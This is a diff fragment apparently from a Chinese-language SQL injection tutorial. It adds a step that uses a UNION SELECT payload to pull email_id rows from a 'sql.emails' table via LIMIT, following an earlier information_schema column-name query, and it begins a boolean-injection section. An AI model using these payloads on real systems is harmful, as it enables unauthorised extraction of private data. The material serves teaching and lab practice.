@@ -42,4 +42,15 @@ union select 1,2,(select column_name from information_schema.columns where table
 ```
 修改limit值就可以得到全部的字段名
 
+4. 查询数据
+现在已经知道了数据库的名字、数据表的名字、字段的名字，要想获取到数据就变得很简单的。以上面获取到的数据库、数据表、字段为例。
+```sql
+    union select 1,2,(select email_id from sql.emails limit 0,1)
+```
+修改limit就可以获取到全部的数据
+
+
+
+## boolean注入
+
 
